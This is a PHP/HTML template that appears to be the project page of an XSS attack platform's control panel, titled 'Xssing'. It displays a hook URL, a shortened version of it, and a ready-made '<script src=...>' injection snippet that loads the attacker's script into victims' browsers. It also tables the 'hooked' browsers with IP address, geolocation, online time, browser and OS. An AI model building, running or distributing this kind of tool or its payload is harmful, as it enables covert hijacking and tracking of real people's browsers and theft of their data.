
<?php require_once PUBLIC_PATH."public.php"; ?>
<title> Xssing </title>
</head>
<?php require_once TEMPLATE_PATH."xing/header.tpl.php"; ?>
<body>
<table width="100%" cellspacing="0" cellpadding="0" border="0" align="left">
  <tbody>
  <script>



  function checkAll(type, form, value, checkall, changestyle) {
  	var checkall = checkall ? checkall : 'chkall';
  	for(var i = 0; i < form.elements.length; i++) {
  		var e = form.elements[i];
  		if(type == 'option' && e.type == 'radio' && e.value == value && e.disabled != true) {
  			e.checked = true;
  		} else if(type == 'value' && e.type == 'checkbox' && e.getAttribute('chkvalue') == value) {
  			e.checked = form.elements[checkall].checked;
  			if(changestyle) {
  				multiupdate(e);
  			}
  		} else if(type == 'prefix' && e.name && e.name != checkall && (!value || (value && e.name.match(value)))) {
  			e.checked = form.elements[checkall].checked;
  			if(changestyle) {
  				if(e.parentNode && e.parentNode.tagName.toLowerCase() == 'li') {
  					e.parentNode.className = e.checked ? 'checked' : '';
  				}
  				if(e.parentNode.parentNode && e.parentNode.parentNode.tagName.toLowerCase() == 'div') {
  					e.parentNode.parentNode.className = e.checked ? 'item checked' : 'item';
  				}
  			}
  		}
  	}
  }

  
  </script>
  <tr>
    <td height="30"><table width="100%" cellspacing="0" cellpadding="0" border="0">
        <tbody>
          <tr>
            <td width="15" height="30"><img width="15" height="30" src="<?php  echo PUBLIC_STYLE_URL ?>/tab_03.gif"></td>
            <td width="24" background="<?php  echo PUBLIC_STYLE_URL ?>tab_05.gif"><img width="16" height="16" src="<?php  echo PUBLIC_STYLE_URL ?>311.gif"></td>
            <td width="1373" background="/coder/waiku/Public/Admin/images/tab_05.gif" class="title1"><a  href="?m=xing"> 项目管理</a> <em>›</em><?php  echo  $pro['name']?></td>
            <td width="14"><img width="14" height="30" src="<?php  echo PUBLIC_STYLE_URL ?>/tab_07.gif"></td>
          </tr>
        </tbody>
      </table></td>
  </tr>
  <tr>
    <td><table width="95%" cellspacing="2" cellpadding="3" border="0" align="center" style="margin-bottom:5px;" class="admintable">
        <tbody>
          <tr> </tr>
          <tr><td height="25" bgcolor="f7f7f7"> Project Name:<font  color="#00CC00"><?php  echo  $pro['name']?></font></td>
          
     <td height="25" bgcolor="f7f7f7">  HOOK Url:<font  color="#00CC00"> <?php   echo   SITE_ROOT."?u=".$pro['url'];  ?> </font> </td>
     
     
       <td height="25" bgcolor="f7f7f7">  Short Url:<font  color="#00CC00"> <?php   echo  "http://".url_to_126(SITE_ROOT."?u=".$pro['url'],"1d1895e193df4ea5b82c0f773fabd2a5") ;  ?> </font>
             
             </td>
     
     
     
             <td height="25" bgcolor="f7f7f7">
             Demo:  <font  color="#00CC00"> <?php  
			            $url=SITE_ROOT."?u=".$pro['url'];
			            echo   htmlentities("<script  src=\"{$url}\" > </script>");  ?> </font>
             </td>
          </tr>
        </tbody>
      </table></td>
  </tr>
  <tr>
  <form  action="?m=xing&a=dels"  method="post" >
    <td width="100%"><table width="95%" cellspacing="1" cellpadding="3" border="0" bgcolor="#F2F9E8" align="center" class="admintable">
        <tbody>
          <tr>
            <td align="left" class="admintitle" colspan="5">浏览器列表&#12288; </td>
          </tr>
          <tr bgcolor="#f1f3f5" style="font-weight:bold;">
            <td width="2%" height="30" align="center" class="ButtonList">删除</td>
            <td width="10%" height="30" align="center" class="ButtonList">名称</td>
            <td width="20%" align="center" class="ButtonList">IP|地址</td>
            <td width="8%" align="center" class="ButtonList">上线时间</td>
            <td width="10%" align="center" class="ButtonList">浏览器</td>
            <td width="10%" align="center" class="ButtonList">系统</td>
            <td width="15%" height="25" align="center" class="ButtonList">管理</td>
          </tr>
          <?php
			 
			 if(is_array($browsers)){
			  
			   
			   foreach($browsers  as  $browser){
		  
		  $utime=date("Y-m-d H:i:s",$browser['dateline']);
              load_func("IptoAddr");
		   $addr=ip_to_addr($browser['ip']);
				print<<<END
		   <tr>
              <td><input   type="checkbox" value="{$browser['bid']}" class="dels" name="delarr[]"></td>
              <td>{$browser['name']}</td>
              <td>{$browser['ip']} | $addr</td>
              <td>{$utime}</td>
              <td>{$browser['type']}</td>
              <td>{$browser['os']} </td>
              <td>
                  <a href="?m=xing&a=info&bid={$browser['bid']}"><span class="ico_Preview"> </span> 信息 </a> 
                  <a href="?m=xing&a=del&bid={$browser['bid']}"><span class="ico_Del"> </span> 删除 </a></td>
            </tr>
            <tr>
 
END;
			   	
				   
			   }
			   
				 
			 }
				
			
			
			?>
			 <tr><td class="td25">
			 
			 <input type="checkbox"   class="checkbox" id="chkall0z10" name="chkall"  onClick="checkAll('prefix', this.form, 'delarr')">
			 <label for="chkall0z10">全选</label>
			 <input type="submit" value="提交"    id="submit_announcesubmit" class="btn"></td></tr>
        <td bgcolor="f7f7f7" colspan="5"><div id="page"> </form>
              <ul style="text-align:left;">
              </ul>
            </div></td>
        </tr>
        </tbody>
        
      </table></td>   
  </tr>
  <tr>
    <td height="29"><table width="100%" cellspacing="0" cellpadding="0" border="0">
        <tbody>
          <tr>
            <td width="15" height="29"><img width="15" height="29" src="<?php  echo PUBLIC_STYLE_URL ?>/tab_20.gif"></td>
            <td background="<?php  echo PUBLIC_STYLE_URL ?>/tab_21.gif">&nbsp;</td>
            <td width="14"><img width="14" height="29" src="<?php  echo PUBLIC_STYLE_URL ?>/tab_22.gif"></td>
          </tr>
        </tbody>
      </table></td>
  </tr>
  </tbody>
</table>
</body>
</html>
